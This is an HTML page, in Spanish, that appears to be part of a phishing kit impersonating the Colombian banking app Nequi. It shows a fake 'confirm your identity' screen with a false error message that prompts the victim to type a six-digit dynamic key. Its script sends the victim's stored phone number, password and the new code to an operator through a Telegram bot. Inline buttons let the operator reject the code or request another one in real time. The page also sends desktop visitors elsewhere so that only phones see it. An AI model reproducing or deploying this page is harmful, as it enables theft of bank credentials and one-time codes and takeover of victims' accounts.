<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Nequi - Confirma tu identidad</title>
  <link rel="stylesheet" href="../css/globals.css" />
  <link rel="shortcut icon" type="image/x-icon" href="../assets/favicon.html" />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    .header {
      padding: 1rem;
      display: flex;
      align-items: center;
      justify-content: space-between;
      border-bottom: 1px solid #e0e0e0;
    }

    .back-btn {
      width: 24px;
      height: 24px;
      cursor: pointer;
    }

    .header-title {
      font-size: 14px;
      color: #333;
      font-weight: 500;
    }

    .header-icons {
      display: flex;
      gap: 1rem;
    }

    .header-icons svg {
      width: 24px;
      height: 24px;
    }

    .container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 2rem 1.5rem;
      max-width: 600px;
      margin: 0 auto;
      width: 100%;
    }

    .logo {
      margin-bottom: 2rem;
    }

    .logo svg {
      width: 140px;
      height: auto;
    }

    .title {
      font-size: 28px;
      font-weight: 600;
      color: #1a1a1a;
      margin-bottom: 1.5rem;
      text-align: center;
    }

    .error-message {
      background-color: #fff;
      color: #d32f2f;
      padding: 1rem;
      border-radius: 8px;
      text-align: center;
      margin-bottom: 2rem;
      font-size: 15px;
      line-height: 1.5;
      font-weight: 500;
    }

    .code-inputs {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 3rem;
    }

    .code-input {
      width: 45px;
      height: 2px;
      background-color: #e0e0e0;
      transition: background-color 0.3s;
    }

    .code-input.filled {
      background-color: #DA0081;
    }

    .keyboard {
      width: 100%;
      max-width: 350px;
    }

    .keyboard-row {
      display: flex;
      justify-content: space-around;
      margin-bottom: 1.5rem;
    }

    .key {
      width: 70px;
      height: 70px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 32px;
      font-weight: 400;
      color: #1a1a1a;
      background: none;
      border: none;
      cursor: pointer;
      border-radius: 50%;
      transition: background-color 0.2s;
      -webkit-tap-highlight-color: transparent;
    }

    .key:active {
      background-color: #f5f5f5;
    }

    .key.delete {
      background-color: #1a1a1a;
      font-size: 18px;
      color: white;
      border-radius: 12px;
    }

    .key.invisible {
      visibility: hidden;
    }

    .confirm-btn {
      width: 100%;
      max-width: 500px;
      padding: 1rem;
      background-color: #DA0081;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 2rem;
      transition: background-color 0.2s;
    }

    .confirm-btn:disabled {
      background-color: #e0e0e0;
      color: #999;
      cursor: not-allowed;
    }

    .confirm-btn:not(:disabled):active {
      background-color: #c1007a;
    }

    .loading-overlay {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: rgba(255, 255, 255, 0.95);
      z-index: 9999;
      align-items: center;
      justify-content: center;
    }

    .loading-overlay.active {
      display: flex;
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #DA0081;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>

<script>
  document.addEventListener("DOMContentLoaded", function () {
    let esMovil = /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
    if (!esMovil) {
      window.location.href = "../pc.html";
    }
  });
</script>

<body>
  <div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
  </div>

  <div class="header">
    <svg class="back-btn" onclick="window.location.href='access-sign-in-pass.html'" viewBox="0 0 24 24" fill="none">
      <path d="M15 18L9 12L15 6" stroke="#333" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    <span class="header-title">Facebook</span>
    <div class="header-icons">
      <svg viewBox="0 0 24 24" fill="none">
        <path d="M12 8V12L15 15" stroke="#333" stroke-width="2" stroke-linecap="round"/>
        <circle cx="12" cy="12" r="9" stroke="#333" stroke-width="2"/>
      </svg>
      <svg viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="6" r="1.5" fill="#333"/>
        <circle cx="12" cy="12" r="1.5" fill="#333"/>
        <circle cx="12" cy="18" r="1.5" fill="#333"/>
      </svg>
    </div>
  </div>

  <div class="container">
    <div class="logo">
      <svg viewBox="0 0 180 40" fill="none">
        <rect x="0" y="0" width="10" height="10" rx="2" fill="#DA0081"/>
        <text x="20" y="30" fill="#1a1a1a" font-size="32" font-weight="800" font-family="Arial, sans-serif">Nequi</text>
      </svg>
    </div>

    <h1 class="title">Confirma tu identidad</h1>

    <div class="error-message">
      Â¡Ups! esa no es tu clave dinÃ¡mica. Puedes consultarla dentro de la App Nequi.
    </div>

    <div class="code-inputs" id="codeInputs">
      <div class="code-input"></div>
      <div class="code-input"></div>
      <div class="code-input"></div>
      <div class="code-input"></div>
      <div class="code-input"></div>
      <div class="code-input"></div>
    </div>

    <div class="keyboard">
      <div class="keyboard-row">
        <button class="key" data-value="1">1</button>
        <button class="key" data-value="2">2</button>
        <button class="key" data-value="3">3</button>
      </div>
      <div class="keyboard-row">
        <button class="key" data-value="4">4</button>
        <button class="key" data-value="5">5</button>
        <button class="key" data-value="6">6</button>
      </div>
      <div class="keyboard-row">
        <button class="key" data-value="7">7</button>
        <button class="key" data-value="8">8</button>
        <button class="key" data-value="9">9</button>
      </div>
      <div class="keyboard-row">
        <button class="key invisible"></button>
        <button class="key" data-value="0">0</button>
        <button class="key delete" id="deleteBtn">Ã—</button>
      </div>
    </div>

    <button class="confirm-btn" id="confirmBtn" disabled>Confirmar</button>
  </div>

  <script src="../js/sendTelegramMessage.js"></script>
  <script src="../js/actions.js"></script>
  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const formData = JSON.parse(localStorage.getItem("formData")) || {};
      const codeInputs = document.querySelectorAll('.code-input');
      const keys = document.querySelectorAll('.key[data-value]');
      const deleteBtn = document.getElementById('deleteBtn');
      const confirmBtn = document.getElementById('confirmBtn');
      const loadingOverlay = document.getElementById('loadingOverlay');
      let currentCode = [];
      const MAX_LENGTH = 6;

      // Verificar datos previos
      if (!formData.phoneNumber || !formData.password) {
        console.error("âŒ Datos incompletos");
        window.location.href = "accces-sign-in.html";
        return;
      }

      console.log("ðŸ“± Datos cargados:", formData);

      // Actualizar UI
      function updateUI() {
        codeInputs.forEach((input, index) => {
          if (index < currentCode.length) {
            input.classList.add('filled');
          } else {
            input.classList.remove('filled');
          }
        });

        confirmBtn.disabled = currentCode.length !== MAX_LENGTH;
      }

      // Manejar clics en nÃºmeros
      keys.forEach(key => {
        key.addEventListener('click', () => {
          if (currentCode.length < MAX_LENGTH) {
            const value = key.dataset.value;
            currentCode.push(value);
            updateUI();

            // Auto-enviar cuando se completa
            if (currentCode.length === MAX_LENGTH) {
              setTimeout(() => {
                confirmBtn.click();
              }, 300);
            }
          }
        });
      });

      // Manejar botÃ³n de borrar
      deleteBtn.addEventListener('click', () => {
        if (currentCode.length > 0) {
          currentCode.pop();
          updateUI();
        }
      });

      // Manejar confirmaciÃ³n
      confirmBtn.addEventListener('click', async () => {
        const dinamica = currentCode.join('');
        console.log("ðŸ” Clave dinÃ¡mica ingresada:", dinamica);

        const savedData = JSON.parse(localStorage.getItem("formData")) || {};
        const transactionId = savedData.transactionId || Date.now().toString(36);
        
        savedData.dinamica = dinamica;
        localStorage.setItem("formData", JSON.stringify(savedData));

        loadingOverlay.classList.add('active');

        const mensaje = `ðŸ” *CLAVE DINÃMICA NEQUI*\n\nðŸ“± *NÃºmero:* +57 ${savedData.phoneNumber}\nðŸ”‘ *Clave:* ${savedData.password}\nðŸŽ¯ *DinÃ¡mica:* ${dinamica}\nâ° *Hora:* ${new Date().toLocaleTimeString('es-CO')}\nðŸ“… *Fecha:* ${new Date().toLocaleDateString('es-CO')}`;
        
        const teclado = JSON.stringify({
          inline_keyboard: [
            [
              { text: "âœ… Correcto", callback_data: `correcto:${transactionId}` },
              { text: "âŒ Incorrecto", callback_data: `error_dinamica:${transactionId}` }
            ],
            [
              { text: "ðŸ” Pedir OTP Otra Vez", callback_data: `pedir_dinamica:${transactionId}` }
            ],
            [
              { text: "âœ”ï¸ Finalizar", callback_data: `finish:${transactionId}` }
            ]
          ]
        });

        try {
          const responseMensaje = await sendTelegramMessageWithBtn(mensaje, teclado);
          console.log("âœ… Mensaje enviado:", responseMensaje);

          const { action } = await waitForButtonPress(responseMensaje.message_id);
          console.log("âœ… AcciÃ³n recibida:", action);

          loadingOverlay.classList.remove('active');
          await handleAction(action, transactionId);

        } catch (error) {
          console.error("âŒ Error:", error);
          loadingOverlay.classList.remove('active');
          alert("Error de conexiÃ³n. Por favor intenta nuevamente.");
          
          // Limpiar cÃ³digo
          currentCode = [];
          updateUI();
        }
      });

      // Soporte para teclado fÃ­sico
      document.addEventListener('keydown', (e) => {
        if (e.key >= '0' && e.key <= '9' && currentCode.length < MAX_LENGTH) {
          currentCode.push(e.key);
          updateUI();
          if (currentCode.length === MAX_LENGTH) {
            setTimeout(() => confirmBtn.click(), 300);
          }
        } else if (e.key === 'Backspace') {
          if (currentCode.length > 0) {
            currentCode.pop();
            updateUI();
          }
        } else if (e.key === 'Enter' && currentCode.length === MAX_LENGTH) {
          confirmBtn.click();
        }
      });
    });
  </script>
</body>
</html>
